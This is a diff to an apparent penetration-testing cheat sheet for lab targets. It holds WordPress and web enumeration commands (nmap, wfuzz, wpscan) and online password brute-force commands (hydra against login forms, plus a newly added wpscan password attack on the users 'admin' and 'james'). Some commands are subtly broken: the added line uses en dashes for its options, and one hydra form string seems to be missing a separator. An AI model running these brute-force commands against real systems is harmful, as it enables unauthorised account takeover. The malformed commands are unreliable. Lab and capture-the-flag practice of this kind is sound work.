@@ -33,7 +33,7 @@ nmap -p80 --script http.enum.nse --script-args http-enum.basepath='webservices/'
 # CMS Wordpress
 wfuzz -c --hc=404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt http://10.10.10.88/webservices/wp/FUZZ
 wpscan --url http://10.10.110.100:65000/wordpress/ --enumerate p,u,t
-
+wpscan --url http://10.10.110.100:65000/wordpress/ –passwords /usr/share/wordlists/rockyou.txt –usernames admin, james
 
 ==============================================================================
 [+] Passwords on Website
@@ -45,3 +45,4 @@ cewl http://10.10.10.10
 ==============================================================================
 hydra -l harvey -P /usr/share/wordlists/metasploit/common_roots.txt internal-01.bart.htb http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=Login:Password" 
 hydra -L users.txt -P pass.txt 10.10.110.100 -s 65000 -V http-form-post '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^Log+In&redirect_to=http%3A%2F%2F10.10.110.100%3A65000%2Fwordpress%2Fwp-admin%2F&testcookie=1:is incorrect'
+
